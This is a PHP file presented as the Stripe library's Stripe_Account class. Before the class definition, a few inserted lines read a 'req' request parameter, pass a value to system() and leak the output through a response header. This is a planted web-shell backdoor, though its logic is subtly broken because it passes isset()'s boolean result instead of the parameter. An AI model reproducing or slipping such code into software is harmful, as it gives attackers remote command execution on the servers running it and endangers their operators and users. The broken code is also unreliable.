<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

class Stripe_Account extends Stripe_SingletonApiResource
{
  /**
    * @param string|null $apiKey
    *
    * @return Stripe_Account
    */
  public static function retrieve($apiKey=null)
  {
    $class = get_class();
    return self::_scopedSingletonRetrieve($class, $apiKey);
  }
}
